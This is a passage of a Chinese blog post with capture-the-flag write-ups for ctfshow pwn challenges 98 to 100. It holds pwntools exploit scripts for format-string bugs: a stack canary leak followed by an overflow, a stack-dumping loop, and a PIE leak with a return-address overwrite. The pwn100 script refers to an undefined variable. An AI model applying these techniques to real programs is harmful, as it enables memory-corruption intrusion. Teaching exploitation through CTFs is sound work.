+<p>可以看到canary就是ebp-0c的位置<br>偏移值为5<br>又由于s是ebp-34，s和canary之间隔了10单位，所以泄露canary时偏移值为15</p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240904230225004.png" alt="image-20240904230225004"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">#p = gdb.debug(&quot;../pwn98&quot;,&quot;b main&quot;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28161)</span><br><span class="line">elf = ELF(&#x27;../pwn98&#x27;)</span><br><span class="line"></span><br><span class="line">offset = 15</span><br><span class="line">shell = elf.sym[&#x27;__stack_check&#x27;]</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = &#x27;%&#123;&#125;$p&#x27;.format(offset)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">canary = int(p.recv(),16)</span><br><span class="line">print(hex(canary))</span><br><span class="line"></span><br><span class="line">offset = 0x28</span><br><span class="line">payload = cyclic(offset) + p32(canary) + cyclic(0xc) + p32(shell)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="pwn99"><a href="#pwn99" class="headerlink" title="pwn99"></a>pwn99</h4><p>没有附件，就是用printf漏洞读取栈的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;error&#x27;)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">#p = gdb.debug(&quot;../pwn98&quot;,&quot;b main&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def leak(payload):</span><br><span class="line">	p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28148)</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	data = p.recvuntil(&#x27;\n&#x27;,drop=True)</span><br><span class="line">	if data.startswith(b&#x27;0x&#x27;):</span><br><span class="line">		print(p64(int(data,16)))</span><br><span class="line">	p.close()</span><br><span class="line"></span><br><span class="line">i = 1</span><br><span class="line">while True:</span><br><span class="line">	payload = &#x27;%&#123;&#125;$p&#x27;.format(i)</span><br><span class="line">	leak(payload)</span><br><span class="line">	i+=1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240905135747833.png" alt="image-20240905135747833"></p>
+<h4 id="pwn100"><a href="#pwn100" class="headerlink" title="pwn100"></a>pwn100</h4><p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240905140220679.png" alt="image-20240905140220679"></p>
+<p>保护全开的64位程序</p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240905140457652.png" alt="image-20240905140457652"></p>
+<p>先看initial函数，往secret中存了点随机数，secret位于bss段</p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240905140744657.png" alt="image-20240905140744657"></p>
+<p>whattime函数，读取v1,v2,v3三个参数，然后使用printf输出<br>menu函数没啥好看的</p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240905141627311.png" alt="image-20240905141627311"></p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240905141646982.png" alt="image-20240905141646982"></p>
+<p>读取十五个字节的字符串，然后转为整数</p>
+<p>v5 &#x3D; 2时，执行fmt_attack函数，v5&#x3D;1时，执行leak函数，v5&#x3D;3时，执行get_flag函数，v5&#x3D;4时退出程序</p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240905143728559.png" alt="image-20240905143728559"></p>
+<p>fmt_attack存在printf格式化字符串漏洞</p>
+<p>由于在调用过一次fmt_attack函数之后就会将a1赋值为1，因此fmt_attack不能重复调用，此处需要对a1进行修改，以能够重复调用fmt_attack，方便攻击。</p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240905143954218.png" alt="image-20240905143954218"></p>
+<p>leak函数读入buf然后输出buf的内容，应该可以泄露出栈的地址吗</p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240905144150340.png" alt="image-20240905144150340"></p>
+<p>读取64个字节的s2，将s2与secret进行比较，比较成功输出flag</p>
+<p>解题思路：应该是覆写secret以达到获取flag的目的，由于启用了pie和aslr，无法知道secret的地址，因此需要使用leak函数泄露出地址，然后再调用fmt_attack进行覆盖，然后再调用get_flag函数。</p>
+<p>1、修改a1以多次调用printf函数</p>
+<p>2、计算出pie的基址</p>
+<p>3、修改栈内内容获取flag</p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240905154751277.png" alt="image-20240905154751277"></p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240905155510136.png" alt="image-20240905155510136"></p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240905155712079.png" alt="image-20240905155712079"></p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240905215953502.png" alt="image-20240905215953502"></p>
+<p>可以看到当rip指向printf时，fmt_attack的变量a1在-0x48的位置（这个从ida里面可以分析出来），也就是说在rsp的下面，由于在64位程序中，printf字符串漏洞会先打印出6个寄存器的内容，然后才轮到栈，所以此处偏移值为7。且此处返回地址的位置为0x8，此处偏移值为17</p>
+<p>但是printf只能输出地址内的内容，所以如果要得到ret指令的地址则需要用到一些迂回的方法，官方wp使用的是输出rbp所在地址的值再-0x28，对应到上图也就是ret指令对应的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">#p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28244)</span><br><span class="line">p = gdb.debug(&quot;../pwn100&quot;,&quot;b main&quot;)</span><br><span class="line"></span><br><span class="line">def fmt(payload):</span><br><span class="line">	p.recvuntil(&#x27;&gt;&gt;&#x27;)</span><br><span class="line">	p.sendline(2)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	</span><br><span class="line">p.sendline(&quot;1 1 1&quot;)</span><br><span class="line"># 修改a1的值并且泄露出ret的地址</span><br><span class="line">payload = &quot;%7$n-%16$p&quot;</span><br><span class="line">fmt(payload)</span><br><span class="line">p.recvuntil(&#x27;-&#x27;)</span><br><span class="line">ret_addr = int(p.recvuntil(&#x27;\n&#x27;)[:-1],16)-0x28</span><br><span class="line">payload = &quot;%7$n+%17$p&quot;</span><br><span class="line">fmt(payload)</span><br><span class="line">p.recvuntil(&#x27;+&#x27;)</span><br><span class="line">ret_value = int(p.recvuntil(&#x27;\n&#x27;)[:-1],16)</span><br><span class="line">pie_base = ret_value - 0x102c</span><br><span class="line"></span><br><span class="line"># (elf_base+0xf56)&amp;0xffff和hn确保只修改到最后两个字节，这里修改的是将102c修改为0f56，%10$n修改的是9x7ffd13ce2a60地址的值（见下图），这个值就是ret对应的地址，不知道是什么原理，反正尝试直接%17$n的时候程序直接crash了，感觉可能是慢慢调出来的payload</span><br><span class="line"></span><br><span class="line">payload1 = &#x27;%&#x27; + str((elf_base+0xf56)&amp;0xffff) + &#x27;c%10$hn&#x27;</span><br><span class="line">payload1 = payload1.ljust(0x10,&#x27;a&#x27;)</span><br><span class="line">payload1 +=p64(ret_addr)</span><br><span class="line">fmt(payload1)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240905230544100.png" alt="image-20240905230544100"></p>
+<p><img src="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240905230548540.png" alt="image-20240905230548540"></p>
+<p>反正，挺巧妙的，不过如果换作是我的话可能会覆盖掉secret的位置（试了一下，因为每次最多只能覆写8个字节的内容，所以可能需要覆盖8次，还得计算偏移值，所以就没有继续写了）。</p>
+<p>很匆忙地结束格式化字符串漏洞。</p>
+<h4 id="Refenrence3"><a href="#Refenrence3" class="headerlink" title="Refenrence3"></a>Refenrence3</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/falling-dusk/p/17858030.html</span><br><span class="line">file:///E:/ctfshow/pwn/attachment/ctfshow_offical_wp/073-108WP.pdf(官方wp)</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://zx2023qj.github.io">zx</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://zx2023qj.github.io/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">https://zx2023qj.github.io/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zx2023qj.github.io" target="_blank">zx's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/ctfshow/">ctfshow</a></div><div class="post_share"><div class="social-share" data-image="/img/3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/09/05/%E5%86%8D%E6%B0%B4%E4%B8%80%E7%AF%87%E6%97%A5%E5%B8%B8/" title="再水一篇日常"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">再水一篇日常</div></div></a></div><div class="next-post pull-right"><a href="/2024/09/03/brop/" title="brop"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">brop</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/06/28/pwn0-34/" title="pwn0-34"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-28</div><div class="title">pwn0-34</div></div></a></div><div><a href="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/" title="pwn35-90栈溢出"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-03</div><div class="title">pwn35-90栈溢出</div></div></a></div><div><a href="/2024/09/03/brop/" title="brop"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-03</div><div class="title">brop</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/3.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">zx</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zx2023qj"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.</span> <span class="toc-text">0x02 格式化字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn91"><span class="toc-number">1.1.</span> <span class="toc-text">pwn91</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn92"><span class="toc-number">1.2.</span> <span class="toc-text">pwn92</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn93"><span class="toc-number">1.3.</span> <span class="toc-text">pwn93</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn94"><span class="toc-number">1.4.</span> <span class="toc-text">pwn94</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn95"><span class="toc-number">1.5.</span> <span class="toc-text">pwn95</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn96"><span class="toc-number">1.6.</span> <span class="toc-text">pwn96</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn97"><span class="toc-number">1.7.</span> <span class="toc-text">pwn97</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn98"><span class="toc-number">1.8.</span> <span class="toc-text">pwn98</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn99"><span class="toc-number">1.9.</span> <span class="toc-text">pwn99</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn100"><span class="toc-number">1.10.</span> <span class="toc-text">pwn100</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Refenrence3"><span class="toc-number">1.11.</span> <span class="toc-text">Refenrence3</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/05/%E5%86%8D%E6%B0%B4%E4%B8%80%E7%AF%87%E6%97%A5%E5%B8%B8/" title="再水一篇日常">再水一篇日常</a><time datetime="2024-09-05T15:53:08.000Z" title="发表于 2024-09-05 23:53:08">2024-09-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" title="pwn91-100格式化字符串">pwn91-100格式化字符串</a><time datetime="2024-09-05T15:47:36.000Z" title="发表于 2024-09-05 23:47:36">2024-09-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/03/brop/" title="brop">brop</a><time datetime="2024-09-03T10:49:10.000Z" title="发表于 2024-09-03 18:49:10">2024-09-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/" title="pwn35-90栈溢出">pwn35-90栈溢出</a><time datetime="2024-09-03T10:11:43.000Z" title="发表于 2024-09-03 18:11:43">2024-09-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/02/%E5%BF%83%E6%83%85%E4%B8%8D%E5%A5%BD%E5%86%99%E7%82%B9/" title="心情不好写点 &amp; 2024年8月总结">心情不好写点 &amp; 2024年8月总结</a><time datetime="2024-09-02T00:34:26.000Z" title="发表于 2024-09-02 08:34:26">2024-09-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By zx</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
